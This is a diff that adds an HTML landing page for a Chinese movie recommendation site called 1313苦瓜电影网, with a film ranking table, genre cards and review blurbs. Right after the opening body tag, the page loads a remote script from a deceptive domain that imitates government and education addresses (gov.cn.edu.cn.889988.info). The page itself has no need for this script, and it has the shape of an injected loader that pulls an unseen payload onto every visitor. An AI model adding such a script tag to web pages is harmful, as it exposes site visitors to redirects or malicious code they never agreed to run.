@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="1313苦瓜电影网 - 清爽不油腻的电影推荐站，精选高分冷门片与独立佳作，用苦瓜精神挑好片。网址：https://1313kuguadianyingwang-top.github.io，清爽观影从这里开始。">
+<meta name="keywords" content="1313苦瓜电影网, 苦瓜电影网, 1313kuguadianyingwang, 高分电影, 冷门佳片, 独立电影, 清爽观影, 1313kuguadianyingwang-top.github.io">
+<title>1313苦瓜电影网 | 清爽不油腻 · 精选高分好电影</title>
+<meta name="robots" content="index,follow">
+<meta property="og:title" content="1313苦瓜电影网 - 清爽不油腻的电影推荐站">
+<meta property="og:description" content="1313苦瓜电影网，精选高分冷门片与独立佳作，清爽观影。网址：https://1313kuguadianyingwang-top.github.io">
+<meta property="og:type" content="website">
+<link rel="canonical" href="https://1313kuguadianyingwang-top.github.io">
+<style>
+:root{
+  --g:#4f9b45;--g2:#7bc26c;--g3:#a8d99a;--dark:#1f3320;--ink:#243025;--paper:#f4f7ee;--card:#fff;--line:#dce6d2;--acid:#c8e63c;--shadow:rgba(31,51,32,.12);
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{font-family:"PingFang SC","Microsoft YaHei","Segoe UI",-apple-system,sans-serif;background:var(--paper);color:var(--ink);line-height:1.75;overflow-x:hidden;}
+a{color:inherit;text-decoration:none;}
+.container{max-width:1160px;margin:0 auto;padding:0 26px;}
+
+/* 顶部 */
+header{position:sticky;top:0;z-index:100;background:rgba(244,247,238,.95);backdrop-filter:blur(8px);border-bottom:2px solid var(--g);}
+.hd-in{max-width:1160px;margin:0 auto;padding:0 26px;display:flex;align-items:center;justify-content:space-between;height:70px;}
+.logo{display:flex;align-items:center;gap:12px;}
+.logo .badge{width:44px;height:44px;border-radius:12px;background:var(--g);color:#fff;display:grid;place-items:center;font-weight:900;font-size:1.1rem;box-shadow:0 4px 12px var(--shadow);transform:rotate(-6deg);}
+.logo b{font-size:1.45rem;font-weight:900;letter-spacing:.5px;}
+.logo b span{color:var(--g);}
+.logo small{display:block;font-size:.68rem;color:#7a8a78;letter-spacing:1px;}
+nav ul{display:flex;list-style:none;gap:4px;}
+nav a{display:block;padding:8px 14px;font-size:.88rem;border-radius:20px;transition:.25s;}
+nav a:hover{background:var(--g);color:#fff;}
+.menu-btn{display:none;background:none;border:none;font-size:1.7rem;cursor:pointer;color:var(--g);}
+
+/* Hero 苦瓜田 */
+.hero{position:relative;padding:100px 26px 90px;background:linear-gradient(160deg,var(--g) 0%,#3f7e3a 100%);color:#fff;overflow:hidden;text-align:center;}
+.hero::before{content:"";position:absolute;inset:0;background-image:radial-gradient(circle at 12% 20%,rgba(255,255,255,.08) 0,transparent 40%),radial-gradient(circle at 85% 70%,rgba(200,230,60,.18) 0,transparent 42%);}
+.hero::after{content:"";position:absolute;left:0;right:0;bottom:-1px;height:46px;background:radial-gradient(ellipse at center bottom,var(--paper) 0%,var(--paper) 60%,transparent 61%) repeat-x;background-size:56px 46px;}
+.hero .inner{position:relative;z-index:2;}
+.hero .bubble{display:inline-block;background:var(--acid);color:var(--dark);font-weight:800;padding:6px 18px;border-radius:30px;font-size:.8rem;letter-spacing:1px;margin-bottom:24px;transform:rotate(-2deg);}
+.hero h1{font-size:clamp(2.4rem,9vw,6.2rem);font-weight:900;line-height:1.05;letter-spacing:-1px;}
+.hero h1 i{font-style:normal;color:var(--acid);text-shadow:2px 2px 0 var(--dark);}
+.hero p.sub{max-width:560px;margin:26px auto 0;font-size:1.1rem;color:#e5f3dc;}
+.hero .url{margin-top:30px;display:inline-block;background:rgba(255,255,255,.16);border:1px dashed rgba(255,255,255,.7);padding:12px 26px;border-radius:12px;font-size:.95rem;backdrop-filter:blur(4px);}
+.hero .url b{color:var(--acid);}
+
+/* 通用 */
+section{padding:92px 0;}
+.sec-head{text-align:center;margin-bottom:52px;}
+.sec-head .kicker{display:inline-block;background:var(--acid);color:var(--dark);font-weight:800;font-size:.72rem;letter-spacing:3px;padding:5px 14px;border-radius:6px;margin-bottom:16px;}
+.sec-head h2{font-size:clamp(1.7rem,4vw,2.7rem);font-weight:900;letter-spacing:-.5px;color:var(--dark);}
+.sec-head h2 em{font-style:normal;color:var(--g);position:relative;}
+.sec-head p{color:#6b7a68;max-width:520px;margin:14px auto 0;font-size:.95rem;}
+
+/* 软盘卡片 */
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:26px;}
+.card{background:var(--card);border:2px solid var(--dark);border-radius:14px;padding:0 0 26px;box-shadow:6px 6px 0 var(--dark);transition:transform .25s,box-shadow .25s;position:relative;overflow:hidden;}
+.card:hover{transform:translate(-3px,-3px);box-shadow:9px 9px 0 var(--dark);}
+.card .slit{height:34px;background:var(--dark);margin-bottom:22px;position:relative;}
+.card .slit::after{content:"";position:absolute;right:0;top:0;width:42%;height:100%;background:var(--g2);}
+.card .body{padding:0 24px;}
+.card .no{font-size:.72rem;font-weight:800;color:var(--g);letter-spacing:2px;}
+.card h3{font-size:1.3rem;margin:8px 0 10px;color:var(--dark);}
+.card p{color:#66755f;font-size:.92rem;}
+
+/* 片单 */
+.flist{background:var(--card);border:2px solid var(--dark);border-radius:16px;box-shadow:8px 8px 0 var(--acid);overflow:hidden;}
+.flist table{width:100%;border-collapse:collapse;}
+.flist th,..flist td{padding:18px 18px;text-align:left;border-bottom:1px dashed var(--line);font-size:.95rem;}
+.flist th{background:var(--dark);color:#fff;font-size:.74rem;letter-spacing:2px;text-transform:uppercase;}
+.flist td.rank{font-weight:900;color:var(--g);font-variant-numeric:tabular-nums;font-size:1.1rem;}
+.flist td.name{font-weight:700;color:var(--dark);}
+.flist td.name span{display:block;font-weight:400;font-size:.8rem;color:#8a9784;margin-top:2px;}
+.flist td.score{font-weight:800;color:var(--g);}
+.flist tr:last-child td{border-bottom:none;}
+.flist tr:hover td{background:#f0f7e9;}
+
+/* 关于：左右分块 */
+.split{display:grid;grid-template-columns:1.1fr 1fr;gap:50px;align-items:center;}
+.chips{display:flex;flex-wrap:wrap;gap:10px;margin-top:24px;}
+.chips span{background:var(--card);border:1.5px solid var(--g);color:var(--g);padding:7px 16px;border-radius:30px;font-size:.85rem;font-weight:600;}
+.quote{background:var(--acid);border:2px solid var(--dark);border-radius:16px;padding:38px 32px;box-shadow:7px 7px 0 var(--dark);transform:rotate(1.5deg);}
+.quote .mk{font-size:3rem;line-height:1;color:var(--g);font-weight:900;}
+.quote p{font-size:1.15rem;font-weight:700;color:var(--dark);margin:10px 0 16px;}
+.quote small{color:#5a6b52;font-size:.88rem;}
+
+/* 三步流程 */
+.steps{display:grid;grid-template-columns:repeat(3,1fr);gap:0;position:relative;}
+.steps .st{background:var(--card);border:2px solid var(--dark);padding:34px 26px;position:relative;}
+.steps .st:nth-child(2){background:#eef6e5;}
+.steps .st .dot{width:52px;height:52px;border-radius:50%;background:var(--g);color:#fff;display:grid;place-items:center;font-weight:900;font-size:1.3rem;margin-bottom:18px;border:3px solid var(--dark);}
+.steps h4{font-size:1.2rem;color:var(--dark);margin-bottom:8px;}
+.steps p{color:#66755f;font-size:.92rem;}
+
+/* 影评：手风琴列表 */
+.review{display:grid;grid-template-columns:repeat(2,1fr);gap:22px;}
+.review .rv{background:var(--card);border:2px solid var(--dark);border-radius:14px;padding:26px;box-shadow:5px 5px 0 var(--g);}
+.review .rv .tag{display:inline-block;background:var(--g);color:#fff;font-size:.72rem;padding:3px 12px;border-radius:20px;margin-bottom:12px;}
+.review .rv h4{color:var(--dark);font-size:1.15rem;margin-bottom:8px;}
+.review .rv p{color:#66755f;font-size:.92rem;}
+
+/* CTA 条纹 */
+.cta{background:repeating-linear-gradient(135deg,var(--g) 0 26px,#47893d 26px 52px);padding:84px 26px;text-align:center;color:#fff;}
+.cta .box{background:var(--dark);max-width:720px;margin:0 auto;padding:46px 34px;border-radius:18px;border:3px solid var(--acid);box-shadow:0 14px 40px rgba(0,0,0,.25);}
+.cta h2{font-size:clamp(1.8rem,5vw,3rem);font-weight:900;line-height:1.25;margin-bottom:18px;}
+.cta h2 i{font-style:normal;color:var(--acid);}
+.cta p{color:#d5e8cb;max-width:540px;margin:0 auto 30px;font-size:1rem;}
+.btn{display:inline-block;background:var(--acid);color:var(--dark);font-weight:900;padding:16px 40px;border-radius:40px;font-size:1rem;transition:.25s;border:2px solid var(--dark);}
+.btn:hover{background:#fff;transform:scale(1.04);}
+
+/* Footer */
+footer{background:var(--dark);color:#cfe0c6;padding:68px 0 24px;}
+.ft{max-width:1160px;margin:0 auto;padding:0 26px;display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:36px;}
+.ft .brand .badge{width:48px;height:48px;border-radius:12px;background:var(--g);color:#fff;display:grid;place-items:center;font-weight:900;font-size:1.2rem;margin-bottom:16px;transform:rotate(-6deg);}
+.ft .brand b{font-size:1.5rem;color:#fff;}
+.ft .brand b span{color:var(--acid);}
+.ft .brand p{color:#9db293;font-size:.9rem;margin-top:12px;line-height:1.85;}
+.ft h5{color:var(--acid);font-size:.75rem;letter-spacing:2px;text-transform:uppercase;margin-bottom:16px;}
+.ft ul{list-style:none;}
+.ft li{margin-bottom:9px;}
+.ft a{color:#b9ccaf;font-size:.9rem;transition:.2s;}
+.ft a:hover{color:#fff;}
+.copy{text-align:center;padding-top:34px;margin:42px 26px 0;max-width:1160px;border-top:1px dashed #456846;font-size:.82rem;color:#7f9676;margin-left:auto;margin-right:auto;}
+.copy a{color:#b9ccaf;}
+
+@media(max-width:900px){
+  .grid,.review{grid-template-columns:repeat(2,1fr);}
+  .steps{grid-template-columns:1fr;}
+  .split{grid-template-columns:1fr;gap:30px;}
+  .ft{grid-template-columns:1fr 1fr;}
+}
+@media(max-width:640px){
+  nav ul{display:none;position:absolute;top:70px;left:0;right:0;flex-direction:column;background:var(--paper);border-bottom:2px solid var(--g);padding:10px 0;}
+  nav ul.open{display:flex;}
+  nav a{border-radius:0;padding:13px 26px;}
+  .menu-btn{display:block;}
+  .hero{padding:70px 20px 80px;}
+  .grid,.review{grid-template-columns:1fr;}
+  .flist .hide{display:none;}
+  .ft{grid-template-columns:1fr;}
+  section{padding:64px 0;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header>
+  <div class="hd-in">
+    <div class="logo"><div class="badge">苦</div><div><b>1313<span>苦瓜电影网</span></b><small>清爽不油腻的观影推荐</small></div></div>
+    <nav>
+      <ul id="menu">
+        <li><a href="#home">首页</a></li>
+        <li><a href="#about">网站简介</a></li>
+        <li><a href="#top">高分片单</a></li>
+        <li><a href="#genre">题材分类</a></li>
+        <li><a href="#guide">苦瓜选片</a></li>
+        <li><a href="#review">影评精选</a></li>
+        <li><a href="#contact">联系我们</a></li>
+      </ul>
+    </nav>
+    <button class="menu-btn" id="toggle" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<main>
+
+  <!-- Hero -->
+  <section class="hero" id="home">
+    <div class="inner">
+      <div class="bubble">清爽不油腻 · 只挑好片</div>
+      <h1>1313<i>苦瓜</i>电影网</h1>
+      <p class="sub">用苦瓜精神挑电影——去油、去腻、去套路，留下清清爽爽的好作品。</p>
+      <div class="url">官方网站 <b>https://1313kuguadianyingwang-top.github.io</b></div>
+    </div>
+  </section>
+
+  <!-- 网站简介 -->
+  <section id="about">
+    <div class="container">
+      <div class="sec-head">
+        <div class="kicker">About Us</div>
+        <h2>关于 <em>1313苦瓜电影网</em></h2>
+        <p>1313苦瓜电影网（1313kuguadianyingwang）是一个清爽的电影推荐站，专注高分冷门片、独立佳作与值得细品的类型电影。</p>
+      </div>
+      <div class="grid">
+        <div class="card">
+          <div class="slit"></div>
+          <div class="body"><div class="no">FEATURE 01</div><h3>去油选片</h3><p>拒绝流量堆砌与营销吹捧，只留真正有内容、有质感的作品。</p></div>
+        </div>
+        <div class="card">
+          <div class="slit"></div>
+          <div class="body"><div class="no">FEATURE 02</div><h3>冷门挖掘</h3><p>热门之外也有好电影，我们帮你从冷门里淘出真正值得看的佳作。</p></div>
+        </div>
+        <div class="card">
+          <div class="slit"></div>
+          <div class="body"><div class="no">FEATURE 03</div><h3>清爽排版</h3><p>绿色护眼、卡片分明，手机和电脑上都能舒适地读推荐、找片子。</p></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 高分片单 -->
+  <section id="top" style="background:#eef5e6;">
+    <div class="container">
+      <div class="sec-head">
+        <div class="kicker">Top Picks</div>
+        <h2>高分 <em>片单</em></h2>
+        <p>精选值得一看的高分电影，排名随口碑持续更新。</p>
+      </div>
+      <div class="flist">
+        <table>
+          <thead><tr><th style="width:56px;">排名</th><th>影片</th><th class="hide">题材</th><th class="hide">地区 / 年份</th><th style="width:76px;">评分</th></tr></thead>
+          <tbody>
+            <tr><td class="rank">01</td><td class="name">肖申克的救赎<span>The Shawshank Redemption</span></td><td class="hide">剧情</td><td class="hide">美国 / 1994</td><td class="score">9.7</td></tr>
+            <tr><td class="rank">02</td><td class="name">控方证人<span>Witness for the Prosecution</span></td><td class="hide">悬疑 · 犯罪</td><td class="hide">美国 / 1957</td><td class="score">9.6</td></tr>
+            <tr><td class="rank">03</td><td class="name">十二怒汉<span>12 Angry Men</span></td><td class="hide">剧情</td><td class="hide">美国 / 1957</td><td class="score">9.4</td></tr>
+            <tr><td class="rank">04</td><td class="name">小鞋子<span>Children of Heaven</span></td><td class="hide">剧情</td><td class="hide">伊朗 / 1997</td><td class="score">9.2</td></tr>
+            <tr><td class="rank">05</td><td class="name">心迷宫<span>The Coffin in the Mountain</span></td><td class="hide">悬疑 · 犯罪</td><td class="hide">中国 / 2014</td><td class="score">8.7</td></tr>
+            <tr><td class="rank">06</td><td class="name">永恒和一日<span>Eternity and a Day</span></td><td class="hide">艺术 · 独立</td><td class="hide">希腊 / 1998</td><td class="score">9.1</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <!-- 苦瓜精神 -->
+  <section>
+    <div class="container">
+      <div class="split">
+        <div>
+          <div class="kicker" style="display:inline-block;background:var(--acid);color:var(--dark);font-weight:800;font-size:.72rem;letter-spacing:3px;padding:5px 14px;border-radius:6px;">Our Spirit</div>
+          <h2 style="font-size:clamp(1.6rem,3.5vw,2.4rem);color:var(--dark);font-weight:900;margin:16px 0;line-height:1.35;">先苦后甜，才是看一部好电影的样子。</h2>
+          <p style="color:#5e6c58;font-size:1rem;">苦瓜微苦，回甘悠长——好电影往往也一样。1313苦瓜电影网（1313kuguadianyingwang）希望陪你慢下来，找到那些值得回味、看完想再聊两句的片子。</p>
+          <div class="chips">
+            <span>清爽选片</span><span>冷门佳作</span><span>高分口碑</span><span>独立电影</span><span>类型多元</span>
+          </div>
+        </div>
+        <div class="quote">
+          <div class="mk">"</div>
+          <p>电影不该只是一键爽完就忘，好片子会在心里留一阵子。</p>
+          <small>—— 1313苦瓜电影网 · 官网 https://1313kuguadianyingwang-top.github.io</small>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 题材分类 -->
+  <section id="genre" style="background:#eef5e6;">
+    <div class="container">
+      <div class="sec-head">
+        <div class="kicker">Genre</div>
+        <h2>题材 <em>分类</em></h2>
+        <p>按题材快速找到你想看的那一类电影。</p>
+      </div>
+      <div class="steps">
+        <div class="st"><div class="dot">1</div><h4>剧情 · 人性</h4><p>聚焦人物命运与社会现实，看完会想聊两句的那些片。</p></div>
+        <div class="st"><div class="dot">2</div><h4>悬疑 · 犯罪</h4><p>烧脑反转、人性博弈，适合喜欢在观影中思考的你。</p></div>
+        <div class="st"><div class="dot">3</div><h4>独立 · 艺术</h4><p>小众但不凑合，作者表达鲜明，越品越有味道。</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 苦瓜选片 -->
+  <section id="guide">
+    <div class="container">
+      <div class="sec-head">
+        <div class="kicker">How We Pick</div>
+        <h2>苦瓜 <em>选片法</em></h2>
+        <p>三步挑出好电影，不踩雷、不浪费时间。</p>
+      </div>
+      <div class="grid">
+        <div class="card"><div class="slit"></div><div class="body"><div class="no">STEP 01</div><h3>看口碑</h3><p>综合专业评分与真实观众反馈，避开被营销吹起的"高分"陷阱。</p></div></div>
+        <div class="card"><div class="slit"></div><div class="body"><div class="no">STEP 02</div><h3>看主创</h3><p>关注导演、编剧与演员的一贯风格，往往比剧情简介更可靠。</p></div></div>
+        <div class="card"><div class="slit"></div><div class="body"><div class="no">STEP 03</div><h3>看版本</h3><p>注意导演剪辑版、院线版等不同版本的时长与内容差异。</p></div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 影评精选 -->
+  <section id="review" style="background:#eef5e6;">
+    <div class="container">
+      <div class="sec-head">
+        <div class="kicker">Review</div>
+        <h2>影评 <em>精选</em></h2>
+        <p>拒绝剧透式快餐短评，用文字认真拆解一部好电影。</p>
+      </div>
+      <div class="review">
+        <div class="rv"><span class="tag">深度长评</span><h4>从镜头到主题，把一部电影讲清楚</h4><p>不只复述剧情，更关注镜头语言、叙事结构与表达意图。</p></div>
+        <div class="rv"><span class="tag">观点对谈</span><h4>观影分歧往往比一致好评更有价值</h4><p>不同视角下的理解与争论，让一部片子越聊越厚。</p></div>
+        <div class="rv"><span class="tag">榜单解析</span><h4>高分榜单里，哪些真值得追</h4><p>榜单背后的口碑与水分，我们帮你分辨清楚。</p></div>
+        <div class="rv"><span class="tag">冷门挖掘</span><h4>在热门之外，找到真正的好片</h4><p>不为流量、只为作品，把冷门佳作带到你面前。</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- CTA -->
+  <section class="cta">
+    <div class="box">
+      <h2>把 1313苦瓜电影网<br>收进你的 <i>书签</i></h2>
+      <p>持续更新高分片单、冷门佳作与深度影评，官网：https://1313kuguadianyingwang-top.github.io</p>
+      <a href="https://1313kuguadianyingwang-top.github.io" class="btn">访问官方网站</a>
+    </div>
+  </section>
+
+</main>
+
+<footer id="contact">
+  <div class="ft">
+    <div class="brand">
+      <div class="badge">苦</div>
+      <b>1313<span>苦瓜电影网</span></b>
+      <p>1313苦瓜电影网（1313kuguadianyingwang）清爽不油腻，精选高分冷门片与独立佳作，为爱电影的你推荐值得一看的好作品。<br>官网：https://1313kuguadianyingwang-top.github.io</p>
+    </div>
+    <div><h5>栏目导航</h5><ul><li><a href="#about">网站简介</a></li><li><a href="#top">高分片单</a></li><li><a href="#genre">题材分类</a></li><li><a href="#guide">苦瓜选片</a></li></ul></div>
+    <div><h5>题材分类</h5><ul><li><a href="#">剧情人性</a></li><li><a href="#">悬疑犯罪</a></li><li><a href="#">独立艺术</a></li><li><a href="#">冷门佳作</a></li></ul></div>
+    <div><h5>联系我们</h5><ul><li><a href="#">投稿合作</a></li><li><a href="#">读者来信</a></li><li><a href="#">关注我们</a></li><li><a href="#contact">联系方式</a></li></ul></div>
+  </div>
+  <div class="copy">© 2026 <a href="https://1313kuguadianyingwang-top.github.io">1313苦瓜电影网</a>（1313kuguadianyingwang）· 官网 https://1313kuguadianyingwang-top.github.io · 版权所有</div>
+</footer>
+
+<script>
+document.getElementById('toggle').addEventListener('click',function(){document.getElementById('menu').classList.toggle('open');});
+</script>
+</body>
+</html>
